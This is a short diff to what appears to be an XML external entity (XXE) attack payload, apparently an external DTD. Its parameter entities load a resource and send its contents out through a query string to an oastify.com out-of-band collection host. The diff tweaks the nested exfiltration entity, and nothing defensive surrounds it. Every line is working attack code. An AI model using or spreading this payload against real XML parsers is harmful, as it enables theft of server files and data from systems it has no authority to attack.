@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "http://rgbjhe8jdnb11f81iauycyyw7nde1hp6.oastify.com">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'rgbjhe8jdnb11f81iauycyyw7nde1hp6.oastify.com/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY exfil SYSTEM 'rgbjhe8jdnb11f81iauycyyw7nde1hp6.oastify.com/?x=%file;'>">
 %eval;
 %exfil;
